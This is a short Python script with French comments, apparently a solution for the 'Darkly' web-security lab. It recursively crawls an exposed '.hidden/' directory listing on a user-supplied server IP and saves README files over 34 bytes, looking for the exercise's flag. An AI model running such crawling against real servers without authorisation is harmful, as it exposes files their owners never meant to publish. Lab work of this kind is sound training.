import requests
from bs4 import BeautifulSoup

# URL de base
address = input("Donnez l'addresse IP du serveur darkly : ")
base_url = "http://" + address + "/.hidden/whtccjokayshttvxycsvykxcfm/"
readme_content = []

# Fonction pour parcourir un répertoire
def explore_directory(url):
    response = requests.get(url)

    # Vérifie si la requête est réussie
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')

        # Parcourt chaque lien trouvé dans la page
        for link in soup.find_all('a'):
            href = link.get('href')

            # Ignore les liens vers les répertoires parent et actuels
            if href not in ['../']:
                # Si c'est un sous-répertoire, on le parcourt récursivement
                if href.endswith('/'):
                    print(f"Exploring directory: {href}")
                    explore_directory(url + href)
                elif href == 'README':  # Si le fichier est un README
                    file_url = url + href
                    print(f"Found README: {file_url}")
                    readme_content.append(download_readme(file_url))

# Fonction pour télécharger et retourner le contenu des fichiers README de plus de 34 octets
def download_readme(url):
    response = requests.get(url)
    if response.status_code == 200 and len(response.text) > 34:  # Vérification de la taille
        print(f"Downloading {url} (Size: {len(response.text)} bytes)")
        return f"Content from {url}:\n{response.text}\n\n"
    return ""

# Fonction pour écrire tout le contenu des README dans un fichier texte
def save_readme_to_file(filename):
    with open(filename, 'w') as f:
        for content in readme_content:
            f.write(content)

# Exploration de l'arborescence
explore_directory(base_url)

# Sauvegarde des README de plus de 34 octets dans un fichier
save_readme_to_file('readme_files.txt')

